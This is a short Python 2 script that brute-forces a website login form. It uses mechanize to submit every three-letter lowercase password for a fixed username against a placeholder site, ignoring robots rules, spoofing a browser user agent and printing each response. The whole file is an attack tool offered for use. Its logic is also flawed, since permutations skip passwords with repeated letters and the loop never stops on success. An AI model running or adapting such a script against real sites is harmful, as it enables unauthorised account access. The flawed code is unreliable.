'''
Brute force a website login page
'''

import mechanize  #pip install 
import itertools


possible_char="abcdefghijklmnopqrstuvwxyz" #possible characters in password
length = 3 #length of the password
site_url = "http://www.randomsite.com" #the login website url
form = "frmHTTPClientLogin" #name of the form in which the login fields are
username = "user" #username

br = mechanize.Browser() 
br.set_handle_robots(False) 
br.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]   


pass_combos = itertools.permutations(possible_char,length)  # generating all the possible password combinations

for password in pass_combos:
	sign_in = br.open(site_url) 
	br.select_form(name = form) 
	
	br["username"] = username		#the key "username" is the variable that takes the username/email value   
	br["password"] = ''.join(password)   #the key "password" is the variable that takes the password value   
	
	logged_in = br.submit()   			#submitting the login credentials   
	logincheck = logged_in.read()  		#reading the page body that is redirected after successful login  
	print 'User :'+username+"\nPassoword tried :"+''.join(password)+"\n Status: "+logincheck 	#printing the body of the redirected url after login   
	 
 	#req = br.open("http://www.randomsite.com/redirect_url").read()  #accessing other url(s) after login is done this way
